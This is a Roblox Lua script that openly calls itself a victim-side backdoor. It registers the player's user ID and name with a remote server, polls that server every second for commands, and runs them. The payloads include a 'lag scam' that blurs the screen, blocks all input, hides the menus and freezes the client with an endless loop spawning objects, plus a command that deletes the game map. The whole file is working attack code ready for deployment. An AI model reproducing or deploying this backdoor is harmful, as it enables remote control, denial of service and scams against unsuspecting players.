--[[ 
	Victim Client Script (Backdoor)
	This script signals availability to the Owner and listens for commands.
]]

local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local StarterGui = game:GetService("StarterGui")
local RunService = game:GetService("RunService")
local ContextActionService = game:GetService("ContextActionService")
local Lighting = game:GetService("Lighting")
local UserInputService = game:GetService("UserInputService")

local LocalPlayer = Players.LocalPlayer
local API_URL = "https://your-app-name.onrender.com" -- [IMPORTANT] CHANGE THIS TO YOUR RENDER URL

-- HTTP Request Helper (Supports most executors: request, http.request, HttpGet)
local http_request = request or http.request or (http and http.request) or nil

local function RegisterToAPI()
	if not http_request then return end
	
	local success, result = pcall(function()
		return http_request({
			Url = API_URL .. "/register",
			Method = "POST",
			Headers = {
				["Content-Type"] = "application/json"
			},
			Body = HttpService:JSONEncode({
				userid = LocalPlayer.UserId,
				username = LocalPlayer.Name
			})
		})
	end)
end

-- Call register immediately
task.spawn(RegisterToAPI)


--------------------------------------------------------------------------------
-- PAYLOADS
--------------------------------------------------------------------------------

local function ActivateLagScam()
	-- 1. Visual Spam
	local blur = Instance.new("BlurEffect")
	blur.Size = 24
	blur.Parent = Lighting
	
	local color = Instance.new("ColorCorrectionEffect")
	color.Contrast = 0.5
	color.Saturation = -1
	color.Parent = Lighting

	-- 2. Input Blocking
	-- Sink all common inputs
	local function sinkInput(actionName, inputState, inputObject)
		return Enum.ContextActionResult.Sink
	end
	
	ContextActionService:BindAction("FreezeInputs", sinkInput, false, unpack(Enum.KeyCode:GetEnumItems()))
	
	-- Disable CoreGuis to prevent easy exit (Soft block)
	pcall(function()
		StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
	end)

	-- 3. The "Lag" (CRASH/FREEZE)
	-- Softlock: Freezing the main thread prevents the Esc menu from opening (mostly)
	task.spawn(function()
		-- Freezing the Replication/Render thread
		while true do
			-- Memory Leak / Instance Spam
			for i=1, 50 do
				local p = Instance.new("Part")
				p.CFrame = CFrame.new(math.random(-2000,2000), math.random(50,500), math.random(-2000,2000))
				p.Size = Vector3.new(math.random(1,20), math.random(1,20), math.random(1,20))
				p.CanCollide = false
				p.Anchored = false -- Physiology calculation stress
				p.Parent = workspace
			end
			
			-- Calculation stress
			for i=1, 10000 do
				local _ = math.sqrt(i) * math.tan(i)
			end
			-- NO WAIT: This causes the thread to hang indefinitely, freezing the client.
		end
	end)
end

local function DeleteMap()
	task.spawn(function()
		for _, v in pairs(workspace:GetChildren()) do
			if v ~= LocalPlayer.Character and not v:IsA("Camera") and not v:IsA("Terrain") then
				v:Destroy()
			end
		end
		-- Also clear terrain if possible (requires write access usually, but clear serves visual purpose)
		if workspace:FindFirstChildOfClass("Terrain") then
			workspace.Terrain:Clear()
		end
	end)
end

--------------------------------------------------------------------------------
-- COMMAND LISTENER
--------------------------------------------------------------------------------

local function ProcessCommand(cmd)
	if cmd == "LAG_SCAM" then
		ActivateLagScam()
	elseif cmd == "DELETE_MAP" then
		DeleteMap()
	end
end

-- Polling Loop
local function PollCommands()
	if not http_request then return end
	
	local success, result = pcall(function()
		local response = http_request({
			Url = API_URL .. "/poll/" .. LocalPlayer.UserId,
			Method = "GET"
		})
		
		if response and response.Body then
			local data = HttpService:JSONDecode(response.Body)
			if data and data.command and data.command ~= "NO_CMD" then
				ProcessCommand(data.command)
			end
		end
	end)
end

-- Start Looping
task.spawn(function()
	while true do
		PollCommands()
		task.wait(1)
	end
end)

print("Victim Client Loaded and Listening...")
